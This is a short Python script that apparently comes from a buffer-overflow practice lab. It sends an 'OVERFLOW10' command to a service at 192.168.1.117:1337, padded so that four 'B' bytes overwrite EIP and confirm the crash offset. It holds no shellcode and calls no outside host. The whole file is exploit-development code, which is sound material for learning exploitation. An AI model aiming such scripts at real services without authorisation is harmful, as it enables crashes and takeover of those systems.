import socket
import sys
import time


print("[+] Nani???? offset!!\n")

buff = "A" * 537

EIP = "B" * 4

fill = "C" * 159

payload = buff + EIP + fill

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW10 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
